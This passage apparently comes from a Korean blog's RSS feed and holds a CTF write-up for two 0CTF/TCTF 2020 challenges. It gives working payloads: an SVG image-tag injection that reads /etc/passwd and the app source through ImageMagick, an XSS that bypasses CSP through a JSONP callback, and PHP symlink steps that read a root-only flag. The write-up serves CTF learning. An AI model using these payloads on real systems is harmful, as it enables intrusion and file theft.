-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; 기능은 &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;를 공유 URL로 만들어주는 기능입니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/share HTTP/1.1
-Host: pwnable.org:5000
-Connection: keep-alive
-Content-Length: 46
-Accept: application/json, text/javascript, */*; q=0.01
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://pwnable.org:5000
-Referer: http://pwnable.org:5000/
-Accept-Encoding: gzip, deflate
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-
-previewid=f2bc983f-4ef5-4ade-89da-7e3ad321d626
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Server: gunicorn/19.10.0
-Date: Tue, 30 Jun 2020 07:47:27 GMT
-Connection: close
-Content-Type: application/json
-Content-Length: 47
-
-{&quot;url&quot;: &quot;http://pwnable.org:5000/share/tTVFUw&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;공유 URL을 접속하게 되면 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img class=&quot;shareimg&quot; src=&quot;/image/tTVFUw/png&quot; id=&quot;preview&quot;/&amp;gt;&lt;/code&gt; 와 같이 이미지를 가져오며  &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;에 의해 랜더링됩니다.&lt;/p&gt;
-
-&lt;p&gt;우리는 FLAG를 얻기 위해서 서버의 쉘을 획득하거나 파일을 읽을 수 있어야합니다.&lt;/p&gt;
-
-&lt;p&gt;이때 위에서 언급했던 이미지를 임의로 삽입 할 수 있는 취약점을 사용합니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;http://u1804.jeong.su:8888/\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;여러가지 Scheme을 사용하여 LFI를 시도한 결과, 아래와 같은 입력 값을 사용하여 로컬 파일을 읽어 올 수 있었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xlink:href=&quot;text:/etc/passwd&quot;
-
-[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;text:/etc/passwd\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;소스코드는 &lt;code class=&quot;highlighter-rouge&quot;&gt;/app/app.py&lt;/code&gt; 경로에서 획득할 수 있었고 아래와 같이 이미지로 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xlink:href=&quot;text:/app/app.py&quot;
-
-[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;text:/app/app.py\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/jeong63.png&quot; alt=&quot;/assets/jeong63.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws&quot;&gt;http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;소스코드를 통해 Admin 기능의 URL을 발견할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;접속을 하면 아래와 같은 메세지와 URL을 입력할 수 있는 Input Box가 나오게됩니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Submit URL that can alert(1) to admin.
-He will give you whatever you want for reward :)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;이제 문제가 XSS Challege, CSP Bypass Challege로 바뀌는 순간입니다.&lt;/p&gt;
-
-&lt;p&gt;사진을 보여주는 Share 기능을 살펴보면 뒤에 확장자가 존재하는 것을 확인 할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://pwnable.org:5000/image/RjtlqV/png&quot;&gt;http://pwnable.org:5000/image/RjtlqV/png&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;png의 값을 임의로 변경했을때 &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Wrong extension&quot;}&lt;/code&gt; 라는 리턴이 출력되는 것을 확인 할 수 있습니다. 확장자가 틀렸다는 메세지가 발생하므로 여러가지 확장자를 시도해봅니다.&lt;/p&gt;
-
-&lt;p&gt;여러가지 이미지 포맷의 확장자는 물론, &lt;code class=&quot;highlighter-rouge&quot;&gt;abc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt;등의 확장자로 &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;이 변환시켜줍니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;exe&lt;/code&gt; 확장자의 경우는 &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Convert exception: u'exe' is unsupported format&quot;}&lt;/code&gt;와 같은 에러가 발생했습니다. (유저의 인풋이 그대로 출력되는 상황입니다.)&lt;/p&gt;
-
-&lt;p&gt;XSS를 트리거하는게 목적이기 때문에 스크립트를 실행 할 수 있는 &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; 확장자도 시도해봤지만 &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Wrong extension&quot;}&lt;/code&gt; 메세지가 발생했고 결국 &lt;code class=&quot;highlighter-rouge&quot;&gt;htm&lt;/code&gt; 확장자를 통해 사용자가 입력한 값을 그대로 출력해줍니다. Wechat 이미지를 생성할 때 생각해보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;image&amp;gt;&lt;/code&gt; 태그를 넣었던 것처럼 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 태그를 삽입해주는 방법으로 스크립트를 실행 할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;여러 기능을 살펴보면서 CSP가 아래와 같이 특정 기능(서비스)에만 걸려있는 것을 확인할 수 있었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pwnable.org:5000/
-http://pwnable.org:5000/share/tTVFUw
-http://pwnable.org:5000/image/tTVFUw/png
-
-Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;default-src 'self'&lt;/code&gt; 때문에 같은 도메인에 js 파일을 업로드하는 방법으로 CSP를 우회 할 수 있겠다라는 생각이 들었습니다. 하지만 주어진 웹 서비스는 파일을 업로드하는 기능이 없습니다. 기능을 사용하면서 아래와 같은 사실을 알게 되었습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; 기능을 사용할 때 &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;로 존재하지 않는 값을 주게 되면 에러가 발생하게 됩니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/share HTTP/1.1
-Host: pwnable.org:5000
-Connection: keep-alive
-Content-Length: 14
-Accept: application/json, text/javascript, */*; q=0.01
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://pwnable.org:5000
-Referer: http://pwnable.org:5000/
-Accept-Encoding: gzip, deflate
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-
-previewid=abcd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Server: gunicorn/19.10.0
-Date: Tue, 30 Jun 2020 08:28:06 GMT
-Connection: close
-Content-Type: application/json
-Content-Length: 47
-
-{&quot;url&quot;: &quot;http://pwnable.org:5000/share/PfLqNp&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET http://pwnable.org:5000/image/PfLqNp/png HTTP/1.1
-Host: pwnable.org:5000
-Connection: keep-alive
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Server: gunicorn/19.10.0
-Date: Tue, 30 Jun 2020 08:29:19 GMT
-Connection: close
-Content-Type: application/json
-Content-Length: 124
-Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
-
-{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/abcd': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;따라서 &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;를 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;+alert(1)+&quot;&lt;/code&gt;로 하고 공유 기능을 사용함으로써 우리는 아래와 같은 JSON을 얻을 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/&quot;+alert(1)+&quot;': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위 JSON을 Javascript Console에서 사용하면 당연히 alert 메세지가 잘뜹니다. 하지만 script의 js 파일처럼 불러오게 되면 아래와 같은 에러가 발생합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/jeong64.png&quot; alt=&quot;/assets/jeong64.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;따라서 JSON 파일을 &lt;script&gt; 태그의 src로 바로 가져올 수 있는 방법을 검색하다보니 보통은 Callback Function을 통해 사용한다고 되어있습니다.&lt;/script&gt;&lt;/p&gt;
-
-&lt;p&gt;하지만 웹 서비스의 javascript를 전부 찾아보았지만 Callback 함수는 존재하지 않았고 반신반의 하며  아래와 같이 요청을 한 결과 callback 함수처럼 변환해주는 기능이 있는 것을 확인했습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pwnable.org:5000/image/mZdWjn/png?callback=xxx
-
-xxx={&quot;error&quot;: &quot;Convert exception: unable to open image `previews/&quot;+alert(1)+&quot;': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;따라서 아래와 같은 스크립트 태그를 사용하여 CSP를 우회 할 수 있었습니다. 여기서 src 또한 공백으로 치환하기 때문에 srsrcc를 사용하여 우회했습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script srsrcc='/image/mZdWjn/png?callback=xxx'&amp;gt;&amp;lt;script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;alert을-실행했지만-flag-인증까지-한-시간이-더-소요된-이야기&quot;&gt;alert을 실행했지만 FLAG 인증까지 한 시간이 더 소요된 이야기&lt;/h3&gt;
-
-&lt;p&gt;FLAG를 주는 시크릿 페이지에서 alert(1)이 실행되는 URL을 제출 했지만 FLAG를 받을 수 없었고 더 열심히 하라는 내용이 출력됐습니다. 문제를 찾을 수 없어서 계속 스크립트도 바꿔보고 콘솔창에 발생하는 모든 에러를 지울 수 있도록 해봤지만 해결이 되지 않아서 IRC에 접속했습니다.&lt;/p&gt;
-
-&lt;p&gt;다행히도 친절한 ADMIN이 FLAG를 주는 봇은 외부에서 접속이 되지 않으며 BASE URL이 다를 수 있다는 이야기를 해줬습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script srsrcc='http://pwnable.org:5000/image/mZdWjn/png?callback=xxx'&amp;gt;&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;처음에는 위와 같이 BASE 서버 주소가 포함된 URL을 요청 했기 때문에 서버에서 alert(1)이 실행되지 않았기 때문에 한 시간이 넘는 시간이 이상한 삽질에 쓰이게 됐습니다. 다음부터는 꼭 인지해야할 것 같습니다^^&lt;/p&gt;
-
-&lt;h2 id=&quot;cloud-computing-v2&quot;&gt;Cloud Computing v2&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Misc (Web + Reversing)
-275 Pts
-18 solved&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Cloud Computing v2 문제는 Cloud Computing 문제와는 다르게 flag가 루트 권한에서만 읽을 수 있게 되어 있습니다. 따라서 flag를 읽을 수 있는 다른 서비스가 있을 것이라고 생각을 했습니다.&lt;/p&gt;
-
-&lt;p&gt;Cloud Computing의 문제에서 open_basedir을 우회하여 루트 폴더를 보면 이상한 agent라는 바이너리가 존재하는 것을 알 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;agent 바이너리는 Echo라는 go 언어의 웹 프레임워크를 사용하여 작성되어 있습니다.&lt;/p&gt;
-
-&lt;p&gt;go 언어를 IDA로 분석하기 위해서 IDAPython 스크립트를 사용했습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/strazzere/golang_loader_assist&quot;&gt;https://github.com/strazzere/golang_loader_assist&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;해당 스크립트의 최신 스크립트는 IDA Pro 7.4 이후 Python3 버전에서 동작하도록 만들어져있습니다.&lt;/p&gt;
-
-&lt;p&gt;따라서 IDA Pro 7.2를 사용하는 저는 이전 commit을 보고 과거 버전에서 동작하는 스크립트를 찾아 실행시켰습니다.&lt;/p&gt;
-
-&lt;p&gt;(&lt;a href=&quot;https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py&quot;&gt;https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;main_main 함수에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:80&lt;/code&gt;로 Echo 서버를 시작하는 것을 알 수 있으며 아래와 같이 라우팅 되는 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/init&lt;/code&gt; ⇒ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_init&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/read&lt;/code&gt; ⇒ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_read&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/scan&lt;/code&gt; ⇒ &lt;code class=&quot;highlighter-rouge&quot;&gt;main_scan&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;3가지 End-Point는 모두 dir을 인자로 받으며 dir은 &lt;code class=&quot;highlighter-rouge&quot;&gt;^/var/www/html/sandbox/[0-9a-f]{40}/&lt;/code&gt; 정규식 검사를 하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_init&lt;/code&gt; 함수는 주어진 dir에 &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;ban&quot;: &quot;flag&quot;}&lt;/code&gt; 내용의 &lt;code class=&quot;highlighter-rouge&quot;&gt;config.json&lt;/code&gt; 파일을 생성해주는 역할을 합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_read&lt;/code&gt; 함수는 주어진 dir에 &lt;code class=&quot;highlighter-rouge&quot;&gt;config.json&lt;/code&gt; 파일을 읽어서 ban 내용을 확인하고 &lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;인자로 넘어온 경로를 읽어주는 역할을 합니다. 읽은 내용은 Base64로 인코딩하여 출력해줍니다. 단 ban에 있는 내용중 한글자라도 일치하게 되면 파일을 읽어주지 않습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main_scan&lt;/code&gt; 함수는 주어진 dir에 있는 &lt;code class=&quot;highlighter-rouge&quot;&gt;*.php&lt;/code&gt; 파일들의 내용을 초기화 해주는 역할을 합니다.&lt;/p&gt;
-
-&lt;p&gt;따라서 아래와 같은 과정을 통해서 flag를 읽을 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo file_get_contents(&quot;http://127.0.0.1/init?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&quot;);
-
-symlink(&quot;/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.json&quot;, &quot;/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.php&quot;);
-
-echo file_get_contents(&quot;http://127.0.0.1/scan?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&quot;);
-
-echo file_get_contents(&quot;http://127.0.0.1/read?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&amp;amp;target=/flag&quot;);
-
-successsuccessfile contents:ZmxhZ3tkYzZhNzNhZjA1MmM2MTM1YjRjNjM1NmE0YWFmMGI1OH0K //flag{dc6a73af052c6135b4c6356a4aaf0b58}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
-        <link>http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2</link>
-        <guid isPermaLink="true">http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2</guid>
-        
-        <category>ctf</category>
-        
-        <category>writeup</category>
-        
-        <category>web</category>
-        
-        <category>reversing</category>
         
         
       </item>
